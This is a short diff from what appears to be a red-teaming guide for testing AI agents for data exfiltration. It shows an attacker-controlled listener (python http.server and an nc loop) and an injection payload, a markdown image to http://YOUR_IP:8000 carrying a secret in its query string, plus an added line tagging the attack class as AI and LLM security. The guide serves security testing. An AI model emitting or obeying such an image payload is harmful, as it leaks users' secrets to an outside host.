@@ -88,6 +88,7 @@ get_collaborator_interactions  → poll after sending; confirm DNS+HTTP + the d=
 Webhook alternative (no Burp):
 ```
 # attacker-controlled listener — proves the agent reached out and what it carried
+- 攻击大类:C44 AI与大模型安全
 python3 -m http.server 8000        # or:
 while true; do printf 'HTTP/1.1 200 OK\r\nContent-Length:0\r\n\r\n' | nc -l 8000; done
 # then inject:  ![x](http://YOUR_IP:8000/p?d=<secret>)
